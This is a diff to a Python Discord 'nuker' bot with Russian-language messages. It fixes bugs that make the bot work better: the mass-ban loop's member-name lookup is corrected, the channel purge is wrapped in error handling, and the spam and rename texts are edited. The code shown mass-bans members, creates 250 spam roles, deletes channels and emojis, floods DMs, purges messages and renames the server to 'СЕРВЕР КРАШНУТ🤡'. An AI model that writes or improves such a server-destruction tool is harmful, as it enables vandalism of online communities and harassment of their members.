@@ -10,13 +10,13 @@ config_example = '''
     'CHANNELS_NAME': 'КРАШ СЕРВЕРА',
 
     # Текст для спама
-    'SPAM_TEXT': '@everyone ВЫАОЛНЯЕТСЯ КРАШ СЕРВЕРА! :clown:',
+    'SPAM_TEXT': '@everyone ВЫПОЛНЯЕТСЯ КРАШ СЕРВЕРА! :clown:',
 
     # Причина для бана
     'BAN_REASON': 'Просто так',
 
     # Новое имя для сервера
-    'RENAME_SERVER_TO': 'СЕРВЕР ВЗЛОМАН',
+    'RENAME_SERVER_TO': 'СЕРВЕР КРАШНУТ🤡',
 
     # Новое имя для ролей
     'ROLES_NAME': 'КРАШ',
@@ -243,7 +243,7 @@ async def CM_CREATE_ROLES(ctx):
         for x in range(250):
             asyncio.create_task(CREATE_ROLE(ctx))
         print(
-            f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] СОздано 250 задач по созданию ролей!'
+            f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Создано 250 задач по созданию ролей!'
         )
     except:
         pass
@@ -278,7 +278,7 @@ async def CM_CDCHANNELS(ctx):
 
 async def CM_MEMBER_BAN(ctx):
     for member in ctx.guild.members:
-        if (member.username + "#" +
+        if (member.name + "#" +
                 str(member.discriminator)) not in data['BAN_EXCLUDES']:
 
             asyncio.create_task(BAN(member))
@@ -306,7 +306,10 @@ async def CM_FLOOD_DM(ctx):
 
 
 async def CM_PURGE(ctx):
-    await ctx.channel.purge(limit=None)
+    try:
+        await ctx.channel.purge(limit=None)
+    except:
+        pass
 
 
 async def CM_DELETE_ALL_EMOJIS(ctx):
@@ -346,7 +349,7 @@ async def nuke(ctx):
         asyncio.create_task(CM_CDCHANNELS(ctx))
 
     if data['NUKER_OPTIONS']['CDROLES']:
-        asyncio.create_task(CM_DELETE_ROLES(ctx))
+        # asyncio.create_task(CM_DELETE_ROLES(ctx))
         asyncio.create_task(CM_CREATE_ROLES(ctx))
 
     if data['NUKER_OPTIONS']['BAN_MEMBERS']:
